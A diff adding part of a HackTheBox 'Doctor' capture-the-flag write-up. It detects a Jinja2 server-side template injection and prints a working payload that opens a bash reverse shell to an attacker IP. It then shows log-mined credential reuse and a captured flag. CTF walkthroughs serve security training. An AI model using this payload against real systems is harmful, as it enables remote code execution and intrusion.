@@ -173,13 +173,124 @@ Checking the source code:
 
 # Explotation#1
 
+When create message in doktors.htb, page redirect us to */home*
 
+![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/d9.PNG)
 
+In the source code of *doctors.htb/archive* we can see our *title*
+
+![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/d9.PNG)
+
+And we remember that the site was made with template. 
+
+I [foud inforamtion](https://portswigger.net/research/server-side-template-injection) about *Template Injection* and two kinds of it Server Side Template Injection (SSTI) and Client Side Template Injection(CSTI).
+
+![](https://gblobscdn.gitbook.com/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-M7O4Hp6bOFFkge_yq4G%2F-M7OCvxwZCiaP8Whx2fi%2Fimage.png?alt=media&token=4b40cf58-5561-4925-bc86-1d4689ca53d1)
+
+Let's start with `{{7*7}}` and check the result in *doctors.htb/archive* 
+
+![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/d10.PNG)
+
+We see the result of the calculation `7*7=49`. With this information, I know that this website is vulnerable for *Sever-Side Template Injection*.
+
+![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/d11.PNG)
+
+The second step is to changing the payload to `{{7*’7′}}`. The result is again reflecting to the archive page.
+
+![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/d12.PNG)
+
+And template is *Jinja2*
+
+![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/d13.PNG)
+
+Search in google rce for Jinja2:
+* https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/
+* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
+* https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
+
+After along time I created the payload to execute a reverse shell.
+
+```
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("bash -c 'bash -i >& /dev/tcp/10.10.16.9/1234 0>&1'").read()}}{%endif%}{%endfor%}
+```
+![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/d16.PNG)
+
+And we have reverse shell
+
+```
+┌──(root💀kali)-[/home/kali/HTB/Doctor]
+└─# nc -lvp 1234                                                                                               1 ⨯
+listening on [any] 1234 ...
+connect to [10.10.16.9] from doctor.htb [10.10.10.209] 44752
+bash: cannot set terminal process group (886): Inappropriate ioctl for device
+bash: no job control in this shell
+web@doctor:~$ 
+```
+
+# Privilege Escalation
+
+Upgrade reverse-shell with python 3
+
+```
+web@doctor:~$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+User *web* belongs to the group *(adm)*.
+
+```
+uid=0(root) gid=0(root) groups=0(root)                                                                             
+uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
+uid=1002(shaun) gid=1002(shaun) groups=1002(shaun)
+uid=1003(splunk) gid=1003(splunk) groups=1003(splunk)
+```
+
+Users of group *adm* can read */var/log/*
+
+Download and run [LinPEAS Script](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS).
+
+Analyzing the result of script...
+
+We find **password `Guitar123`** in `/var/log/apache2/backup/`
+
+```
+[+] Finding passwords inside logs (limit 70)
+Binary file /var/log/apache2/access.log.12.gz matches                                                              
+Binary file /var/log/journal/62307f5876ce4bdeb1a4be33bebfb978/system.journal matches
+Binary file /var/log/journal/62307f5876ce4bdeb1a4be33bebfb978/user-1001.journal matches
+Binary file /var/log/kern.log.2.gz matches
+Binary file /var/log/kern.log.4.gz matches
+Binary file /var/log/syslog.4.gz matches
+/var/log/apache2/backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
+/var/log/auth.log.1:Sep 22 13:01:23 doctor sshd[1704]: Failed password for invalid user shaun from 10.10.14.2 port 40896 ssh2
+/var/log/auth.log.1:Sep 22 13:01:28 doctor sshd[1704]: Failed password for invalid user shaun from 10.10.14.2 port 40896 ssh2
+/var/log/auth.log.1:Sep 23 15:38:45 doctor sudo:    shaun : command not allowed ; TTY=tty1 ; PWD=/home/shaun ; USER=root ; COMMAND=list
+```
+
+User **shaun** reset password to **Guitar123**. Try to login as **shaun**.
+
+```
+web@doctor:~$ su shaun
+su shaun
+Password: Guitar123
+
+shaun@doctor:/home/web$ cd ~
+cd ~
+shaun@doctor:~$ ls  
+ls
+user.txt
+
+shaun@doctor:~$ cat user.txt
+cat user.txt
+64acf6b629d131795385346c319d092a
+```
+
+We have success and get **user.txt**.
 
 # Explotation#2
 
+Run [LinPEAS Script](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), analyzing and nothing..
 
-# Privilege Escalation
+Also I remember about Splunk. Let's use our credentials to login in Splunk.
 
 
 
